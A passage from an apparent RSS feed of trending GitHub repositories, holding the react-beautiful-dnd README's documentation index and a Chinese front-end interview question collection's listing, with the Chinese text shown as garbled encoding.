&lt;p&gt;There are a lot of libraries out there that allow for drag and drop interactions within React. Most notable of these is the amazing &lt;a href=&quot;https://github.com/react-dnd/react-dnd&quot;&gt;&lt;code&gt;react-dnd&lt;/code&gt;&lt;/a&gt;. It does an incredible job at providing a great set of drag and drop primitives which work especially well with the &lt;a href=&quot;https://www.quirksmode.org/blog/archives/2009/09/the_html5_drag.html&quot;&gt;wildly inconsistent&lt;/a&gt; html5 drag and drop feature. &lt;code&gt;react-beautiful-dnd&lt;/code&gt; is a higher level abstraction specifically built for lists (vertical, horizontal, movement between lists, nested lists and so on). Within that subset of functionality &lt;code&gt;react-beautiful-dnd&lt;/code&gt; offers a powerful, natural and beautiful drag and drop experience. However, it does not provide the breadth of functionality offered by &lt;code&gt;react-dnd&lt;/code&gt;. So &lt;code&gt;react-beautiful-dnd&lt;/code&gt; might not be for you depending on what your use case is.&lt;/p&gt; 
&lt;h2&gt;Documentation üìñ&lt;/h2&gt; 
&lt;h3&gt;About üëã&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/about/installation.md&quot;&gt;Installation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/about/examples.md&quot;&gt;Examples and samples&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://egghead.io/courses/beautiful-and-accessible-drag-and-drop-with-react-beautiful-dnd&quot;&gt;Get started&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/about/design-principles.md&quot;&gt;Design principles&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/about/animations.md&quot;&gt;Animations&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/about/accessibility.md&quot;&gt;Accessibility&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/about/browser-support.md&quot;&gt;Browser support&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Sensors üîâ&lt;/h3&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;The ways in which somebody can start and control a drag&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/sensors/mouse.md&quot;&gt;Mouse dragging üê≠&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/sensors/touch.md&quot;&gt;Touch dragging üëâüì±&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/sensors/keyboard.md&quot;&gt;Keyboard dragging üéπ‚ôøÔ∏è&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/sensors/sensor-api.md&quot;&gt;Create your own sensor&lt;/a&gt; (allows for any input type as well as scripted experiences)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;API üèãÔ∏è‚Äç&lt;/h3&gt; 
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/2182637/53607406-c8f3a780-3c12-11e9-979c-7f3b5bd1bfbd.gif&quot; alt=&quot;diagram&quot;&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/api/drag-drop-context.md&quot;&gt;&lt;code&gt;&amp;lt;DragDropContext /&amp;gt;&lt;/code&gt;&lt;/a&gt; - &lt;em&gt;Wraps the part of your application you want to have drag and drop enabled for&lt;/em&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/api/droppable.md&quot;&gt;&lt;code&gt;&amp;lt;Droppable /&amp;gt;&lt;/code&gt;&lt;/a&gt; - &lt;em&gt;An area that can be dropped into. Contains &lt;code&gt;&amp;lt;Draggable /&amp;gt;&lt;/code&gt;s&lt;/em&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/api/draggable.md&quot;&gt;&lt;code&gt;&amp;lt;Draggable /&amp;gt;&lt;/code&gt;&lt;/a&gt; - &lt;em&gt;What can be dragged around&lt;/em&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/api/reset-server-context.md&quot;&gt;&lt;code&gt;resetServerContext()&lt;/code&gt;&lt;/a&gt; - &lt;em&gt;Utility for server side rendering (SSR)&lt;/em&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Guides üó∫&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/responders.md&quot;&gt;&lt;code&gt;&amp;lt;DragDropContext /&amp;gt;&lt;/code&gt; responders&lt;/a&gt; - &lt;em&gt;&lt;code&gt;onDragStart&lt;/code&gt;, &lt;code&gt;onDragUpdate&lt;/code&gt;, &lt;code&gt;onDragEnd&lt;/code&gt; and &lt;code&gt;onBeforeDragStart&lt;/code&gt;&lt;/em&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/combining.md&quot;&gt;Combining &lt;code&gt;&amp;lt;Draggable /&amp;gt;&lt;/code&gt;s&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/common-setup-issues.md&quot;&gt;Common setup issues&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/using-inner-ref.md&quot;&gt;Using &lt;code&gt;innerRef&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/setup-problem-detection-and-error-recovery.md&quot;&gt;Setup problem detection and error recovery&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/identifiers.md&quot;&gt;Rules for &lt;code&gt;draggableId&lt;/code&gt; and &lt;code&gt;droppableId&lt;/code&gt;s&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/browser-focus.md&quot;&gt;Browser focus retention&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/drop-animation.md&quot;&gt;Customising or skipping the drop animation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/auto-scrolling.md&quot;&gt;Auto scrolling&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/screen-reader.md&quot;&gt;Controlling the screen reader&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/doctype.md&quot;&gt;Use the html5 &lt;code&gt;doctype&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/types.md&quot;&gt;&lt;code&gt;TypeScript&lt;/code&gt; and &lt;code&gt;flow&lt;/code&gt;: type information&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/dragging-svgs.md&quot;&gt;Dragging &lt;code&gt;&amp;lt;svg&amp;gt;&lt;/code&gt;s&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/avoiding-image-flickering.md&quot;&gt;Avoiding image flickering&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/preset-styles.md&quot;&gt;Non-visible preset styles&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/how-we-detect-scroll-containers.md&quot;&gt;How we detect scroll containers&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/how-we-use-dom-events.md&quot;&gt;How we use dom events&lt;/a&gt; - &lt;em&gt;Useful if you need to build on top of &lt;code&gt;react-beautiful-dnd&lt;/code&gt;&lt;/em&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/changes-while-dragging.md&quot;&gt;Adding &lt;code&gt;&amp;lt;Draggable /&amp;gt;&lt;/code&gt;s during a drag (11.x behaviour)&lt;/a&gt; - &lt;em&gt;‚ö†Ô∏è Advanced&lt;/em&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/content-security-policy.md&quot;&gt;Setting up Content Security Policy&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Patterns üë∑‚Äç&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/patterns/virtual-lists.md&quot;&gt;Virtual lists üëæ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/patterns/multi-drag.md&quot;&gt;Multi drag&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/patterns/tables.md&quot;&gt;Tables&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/reparenting.md&quot;&gt;Reparenting a &lt;code&gt;&amp;lt;Draggable /&amp;gt;&lt;/code&gt;&lt;/a&gt; - &lt;em&gt;Using our cloning API or your own portal&lt;/em&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Support üë©‚Äç‚öïÔ∏è&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/support/engineering-health.md&quot;&gt;Engineering health&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/support/community-and-addons.md&quot;&gt;Community and addons&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/atlassian/react-beautiful-dnd/releases&quot;&gt;Release notes and changelog&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/support/upgrading.md&quot;&gt;Upgrading&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/atlassian/react-beautiful-dnd/issues&quot;&gt;Road map&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/support/media.md&quot;&gt;Media&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Read this in other languages üåé&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/LeeHyungGeun/react-beautiful-dnd-kr&quot;&gt;&lt;img src=&quot;https://raw.githubusercontent.com/gosquared/flags/master/flags/flags/shiny/24/South-Korea.png&quot; alt=&quot;kr&quot;&gt; &lt;strong&gt;ÌïúÍ∏Ä/Korean&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/vtereshyn/react-beautiful-dnd-ru&quot;&gt;&lt;img src=&quot;https://raw.githubusercontent.com/gosquared/flags/master/flags/flags/shiny/24/Russia.png&quot; alt=&quot;ru&quot;&gt; &lt;strong&gt;–ù–∞ —Ä—É—Å—Å–∫–æ–º/Russian&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/dudestein/react-beautiful-dnd-pt&quot;&gt;&lt;img src=&quot;https://raw.githubusercontent.com/gosquared/flags/master/flags/flags/shiny/24/Brazil.png&quot; alt=&quot;pt&quot;&gt; &lt;strong&gt;Portugu√™s/Portuguese&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/hdks55l/react-beautiful-dnd-gr&quot;&gt;&lt;img src=&quot;https://raw.githubusercontent.com/gosquared/flags/master/flags/flags/shiny/24/Greece.png&quot; alt=&quot;gr&quot;&gt; &lt;strong&gt;ŒïŒªŒªŒ∑ŒΩŒπŒ∫Œ¨/Greek&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Author ‚úçÔ∏è&lt;/h2&gt; 
&lt;p&gt;Alex Reardon &lt;a href=&quot;https://twitter.com/alexandereardon&quot;&gt;@alexandereardon&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Collaborators ü§ù&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Bogdan Chadkin &lt;a href=&quot;https://twitter.com/IAmTrySound&quot;&gt;@IAmTrySound&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Luke Batchelor &lt;a href=&quot;https://twitter.com/alukebatchelor&quot;&gt;@alukebatchelor&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Jared Crowe &lt;a href=&quot;https://twitter.com/jaredjcrowe&quot;&gt;@jaredjcrowe&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Many other &lt;a href=&quot;https://twitter.com/Atlassian&quot;&gt;@Atlassian&lt;/a&gt;&#39;s!&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>lgwebdream/FE-Interview</title>
      <link>https://github.com/lgwebdream/FE-Interview</link>
      <description>&lt;p&gt;üî•üî•üî• ÂâçÁ´ØÈù¢ËØïÔºåÁã¨ÊúâÂâçÁ´ØÈù¢ËØïÈ¢òËØ¶Ëß£ÔºåÂâçÁ´ØÈù¢ËØïÂà∑È¢òÂøÖÂ§áÔºå1000+ÂâçÁ´ØÈù¢ËØïÁúüÈ¢òÔºåHtml„ÄÅCss„ÄÅJavaScript„ÄÅVue„ÄÅReact„ÄÅNode„ÄÅTypeScript„ÄÅWebpack„ÄÅÁÆóÊ≥ï„ÄÅÁΩëÁªú‰∏éÂÆâÂÖ®„ÄÅÊµèËßàÂô®&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;‚òï ÂâçÁ´ØÈù¢ËØïÊØèÊó•‰∏ÄÈ¢ò&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;ÊØèÂ§© get ‰∏Ä‰∏™Áü•ËØÜÁÇπ&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Day282:Ê†πÊçÆÊØèÊó•Ê∞îÊ∏©ÂàóË°®ÔºåËØ∑ÈáçÊñ∞ÁîüÊàê‰∏Ä‰∏™ÂàóË°®ÔºåÂØπÂ∫î‰ΩçÁΩÆÁöÑËæìÂá∫ÊòØÈúÄË¶ÅÂÜçÁ≠âÂæÖÂ§ö‰πÖÊ∏©Â∫¶Êâç‰ºöÂçáÈ´òË∂ÖËøáËØ•Êó•ÁöÑÂ§©Êï∞„ÄÇÂ¶ÇÊûú‰πãÂêéÈÉΩ‰∏ç‰ºöÂçáÈ´òÔºåËØ∑Âú®ËØ•‰ΩçÁΩÆÁî® 0 Êù•‰ª£Êõø„ÄÇ&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// ‰æãÂ¶ÇÔºåÁªôÂÆö‰∏Ä‰∏™ÂàóË°® temperatures = [73, 74, 75, 71, 69, 72, 76, 73]Ôºå‰Ω†ÁöÑËæìÂá∫Â∫îËØ•ÊòØ [1, 1, 4, 2, 1, 1, 0, 0]„ÄÇ
// ÊèêÁ§∫ÔºöÊ∞îÊ∏© ÂàóË°®ÈïøÂ∫¶ÁöÑËåÉÂõ¥ÊòØ [1, 30000]„ÄÇÊØè‰∏™Ê∞îÊ∏©ÁöÑÂÄºÁöÑÂùá‰∏∫ÂçéÊ∞èÂ∫¶ÔºåÈÉΩÊòØÂú® [30, 10
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1103&quot;&gt;Á≠îÊ°à&amp;amp;Ëß£Êûê&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;üìö ÂâçÁ´ØÈù¢ËØïÈ¢òÊ±áÊÄª&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview/issues&quot;&gt;ÂÖ®ÈÉ®Èù¢ËØïÈ¢òÊ±áÊÄª&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;üì± ÊâãÊú∫Âà∑È¢ò(ÈôÑÂ∏¶ËØ¶ÁªÜÁ≠îÊ°à)&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;‰∫åÁª¥Á†ÅÂä†ËΩΩÂ§±Ë¥•ËØ∑ÁÇπÂáª &lt;a href=&quot;http://img-static.yidengxuetang.com/wxapp/issue-img/wxqr-github.png&quot;&gt;ÂÖ•Âè£&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;‚è±Ô∏è ÊúÄËøëÊõ¥Êñ∞&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1102&quot;&gt;Day281:ÁªôÂÆö‰∏Ä‰∏™ÈìæË°®ÔºåËøîÂõûÈìæË°®ÂºÄÂßãÂÖ•ÁéØÁöÑÁ¨¨‰∏Ä‰∏™ÁªìÁÇπ„ÄÇ Â¶ÇÊûúÈìæË°®Êó†ÁéØÔºåÂàôËøîÂõû null„ÄÇ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1101&quot;&gt;Day280:ÁªôÂÆö‰∏Ä‰∏™ÈìæË°®ÔºåÂ¶Ç‰ΩïÂà§Êñ≠ÈìæË°®ÊòØÂê¶ÊúâÁéØÔºü&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1100&quot;&gt;Day279:ÂèçËΩ¨‰ªé‰ΩçÁΩÆ m Âà∞ n ÁöÑÈìæË°®„ÄÇËØ∑‰ΩøÁî®‰∏ÄË∂üÊâ´ÊèèÂÆåÊàêÂèçËΩ¨„ÄÇ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1099&quot;&gt;Day278:ÂÆö‰πâ‰∏Ä‰∏™ÂáΩÊï∞ÔºåËæìÂÖ•‰∏Ä‰∏™ÈìæË°®ÁöÑÂ§¥ÁªìÁÇπÔºåÂèçËΩ¨ËØ•ÈìæË°®Âπ∂ËæìÂá∫ÂèçËΩ¨ÂêéÈìæË°®ÁöÑÂ§¥ÁªìÁÇπ„ÄÇ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1098&quot;&gt;Day277:ÁªôÂÆö‰∏Ä‰∏™ÈìæË°®ÔºåÂà†Èô§ÈìæË°®ÁöÑÂÄíÊï∞Á¨¨ n ‰∏™ÁªìÁÇπÔºåÂπ∂‰∏îËøîÂõûÈìæË°®ÁöÑÂ§¥ÁªìÁÇπ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1097&quot;&gt;Day276:ÁªôÂÆö‰∏Ä‰∏™ÊéíÂ∫èÈìæË°®ÔºåÂà†Èô§ÊâÄÊúâÂê´ÊúâÈáçÂ§çÊï∞Â≠óÁöÑÁªìÁÇπÔºåÂè™‰øùÁïôÂéüÂßãÈìæË°®‰∏≠Ê≤°ÊúâÈáçÂ§çÂá∫Áé∞ÁöÑÊï∞Â≠ó„ÄÇ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1096&quot;&gt;Day275:ËæìÂÖ•‰∏§‰∏™ÈÄíÂ¢ûÊéíÂ∫èÁöÑÈìæË°®ÔºåÂêàÂπ∂Ëøô‰∏§‰∏™ÈìæË°®Âπ∂‰ΩøÊñ∞ÈìæË°®‰∏≠ÁöÑËäÇÁÇπ‰ªçÁÑ∂ÊòØÈÄíÂ¢ûÊéíÂ∫èÁöÑ„ÄÇ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1095&quot;&gt;Day274:ËÆæËÆ° AutoComplete ÁªÑ‰ª∂(ÂèàÂè´ÊêúÁ¥¢ÁªÑ‰ª∂„ÄÅËá™Âä®Ë°•ÂÖ®ÁªÑ‰ª∂Á≠â)Êó∂ÔºåÈúÄË¶ÅËÄÉËôë‰ªÄ‰πàÈóÆÈ¢òÔºü&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1094&quot;&gt;Day273:ÂÜôÂá∫ÊâßË°åÁªìÊûúÔºåÂπ∂Ëß£Èáä‰∏∫‰ªÄ‰πàÔºü&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1093&quot;&gt;Day272:ËÆæËÆ°‰∏Ä‰∏™ÊîØÊåÅ‰∏§ÁßçÊìç‰ΩúÁöÑÊï∞ÊçÆÁªìÊûÑ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1092&quot;&gt;Day271:ÁªôÂÆö‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ sÔºåÊúÄÂ§öÂà†Èô§‰∏Ä‰∏™Â≠óÁ¨¶„ÄÇÂà§Êñ≠ÊòØÂê¶ËÉΩÊàê‰∏∫ÂõûÊñáÂ≠óÁ¨¶‰∏≤„ÄÇ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1091&quot;&gt;Day270:Áªô‰Ω†‰∏Ä‰∏™ÂåÖÂê´ n ‰∏™Êï¥Êï∞ÁöÑÊï∞ÁªÑ numsÔºåÂà§Êñ≠ nums ‰∏≠ÊòØÂê¶Â≠òÂú®‰∏â‰∏™ÂÖÉÁ¥† aÔºåbÔºåc Ôºå‰ΩøÂæó a + b + c = 0 ÔºüËØ∑‰Ω†ÊâæÂá∫ÊâÄÊúâÊª°Ë∂≥Êù°‰ª∂‰∏î‰∏çÈáçÂ§çÁöÑ‰∏âÂÖÉÁªÑ„ÄÇ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1090&quot;&gt;Day269:Áªô‰Ω†‰∏§‰∏™ÊúâÂ∫èÊï¥Êï∞Êï∞ÁªÑ nums1 Âíå nums2ÔºåËØ∑‰Ω†Â∞Ü nums2 ÂêàÂπ∂Âà∞ nums1 ‰∏≠Ôºå‰Ωø nums1 Êàê‰∏∫‰∏Ä‰∏™ÊúâÂ∫èÊï∞ÁªÑ„ÄÇ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1089&quot;&gt;Day268:ËØ∑‰øÆÊîπ‰ª£Á†ÅË∑≥Âá∫Ê≠ªÂæ™ÁéØ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1088&quot;&gt;Day267:ËØ∑ÂÜôÂá∫ÊâßË°åÁªìÊûú,Âπ∂Ëß£ÈáäÂéüÂõ†&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1087&quot;&gt;Day266:ÂÜôÂá∫‰∏ãÈù¢‰ª£Á†ÅÁªìÊûúÔºåÂπ∂Ëß£Èáä‰∏∫‰ªÄ‰πàÔºü&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1085&quot;&gt;Day265:‰∫ÜËß£Ëøá RPC ÂêóÔºåÁÆÄÂçïËØ¥‰∏Ä‰∏ã?&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1084&quot;&gt;Day264:ËØ∑ÂÆûÁé∞ uncurring ÂÆåÊàêÂáΩÊï∞ÊüØÈáåÂåñ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1082&quot;&gt;Day263:ËØ∑ÂÜôÂá∫‰ª•‰∏ã‰ª£Á†ÅÁªìÊûúÔºåÂπ∂Ëß£Èáä‰∏∫‰ªÄ‰πàÔºü&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lgwebdream/FE-Interview-Planet/issues/1081&quot;&gt;Day262:‰∏∫‰ªÄ‰πà WeakMap Âíå WeakSet ÁöÑÈîÆÂè™ËÉΩ‰ΩøÁî®ÂØπË±°ÔºüÂú®‰ªÄ‰πàÂú∫ÊôØ‰∏ã‰ΩøÁî®Ôºü&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üè† ÂâçÁ´ØÈù¢ËØï Family&lt;/h2&gt; 
&lt;p&gt;Â¶ÇÊûú‰Ω†Âú®Â∑•‰Ωú‰∏≠ÈÅáÂà∞ÈóÆÈ¢ò„ÄÅÂú®Èù¢ËØï‰∏≠ÈÅáÂà∞ÁñëÊÉë„ÄÅÂú®ÂâçÁ´ØË∑Ø‰∏äÈÅáÂà∞‰∫ÜÈòªÁ¢çÔºåÈÉΩÂèØ‰ª•Âä†ÂÖ•Êàë‰ª¨ÂâçÁ´ØÊòüÁêÉ FamilyÔºåÊàë‰ª¨‰ºöÁ´≠Â∞ΩÂÖ®Âäõ‰∏∫Â§ßÂÆ∂Á≠îÁñëËß£ÊÉëÔºåËÆ©Êàë‰ª¨ÂÖ±ÂêåÂä™ÂäõÔºå‰∏ÄÂêåÊàêÈïø„ÄÇ&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;ÁâàÊùÉËÆ∏ÂèØ&lt;/h2&gt; 
&lt;p&gt;&lt;img src=&quot;http://img-static.yidengxuetang.com/wxapp/github-img/copyright.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt; 
&lt;p&gt;Êú¨‰ΩúÂìÅÈááÁî®&lt;a href=&quot;http://creativecommons.org/licenses/by-nc/4.0/&quot;&gt;Áü•ËØÜÂÖ±‰∫´ÁΩ≤Âêç-ÈùûÂïÜ‰∏öÊÄß‰ΩøÁî® 4.0 ÂõΩÈôÖËÆ∏ÂèØÂçèËÆÆ&lt;/a&gt;ËøõË°åËÆ∏ÂèØÔºåÂè™Ë¶Å‰øùÊåÅÂéü‰ΩúËÄÖÁΩ≤ÂêçÂíåÈùûÂïÜÁî®ÔºåÊÇ®ÂèØ‰ª•Ëá™Áî±Âú∞ÈòÖËØª„ÄÅÂàÜ‰∫´„ÄÅ‰øÆÊîπ„ÄÇ&lt;/p&gt;</description>
    </item>
    
    <item>
